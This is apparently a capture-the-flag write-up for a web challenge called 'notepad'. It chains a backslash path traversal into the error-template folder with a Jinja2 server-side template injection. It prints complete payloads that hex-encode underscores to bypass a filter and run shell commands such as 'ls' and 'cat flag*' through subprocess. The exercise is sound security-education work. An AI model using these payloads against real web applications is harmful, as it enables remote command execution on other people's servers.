# notepad

## Description
This write up will show how to solve the CTF for "notepad"

## Solution
The source code of the web application is given as well as `notepad.tar`.</br>
Decompress `notepad.tar` with `tar -xf notepad.tar`</br>
Investigating the code, basically only `app.py` is interesting.</br>
It is not allowed to use `_` or `/` and strings can't be longer than 512 characters.</br>

Every post is saved as a file in the `static` folder with the first 128 characters of the post, plus a base64 encoded string.</br>

To include the output of our input, is included in `templates/errors`, however the flag will be in the end in the main app folder.</br>
Hence, the payload we use is: `..\template\errors\123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678`, which is 128 charaters long.</br>
The file will be saved in the `static` folder as `123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678` with a random string and `.html`.</br>
With `/?error=` we can read the output, the only thing that changes is the random string at the end:</br>
`/?error=123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-<<random string>>`, not there is no `.html` at the end!!</br>

To create an initial payload to see if it wil be reflected we can use `{{7*7}}`, i.e. `..\template\errors\123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678{{7*7}}`</br>
It will return after the payload the number 49, meaning whatever we put as a payload, will be executed.</br>

As it is not possible to include `_` and `/`, we can try to use hex: `{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()}}`</br>
The result is, that it will reflect the subclass, so that works.</br>
Now we can expand the payload to navigate around, starting by figuring out what we see in the current directory:</br>
`..\templates\errors\123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678 {{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(273)('ls',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('decode')('utf-8')}}`</br>
There is a flag with a file. Now we can replace `ls` with `cat flag*`:</br>
`..\templates\errors\123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678 {{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(273)('cat flag*',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('decode')('utf-8')}}`</br>
This will reveal the flag.
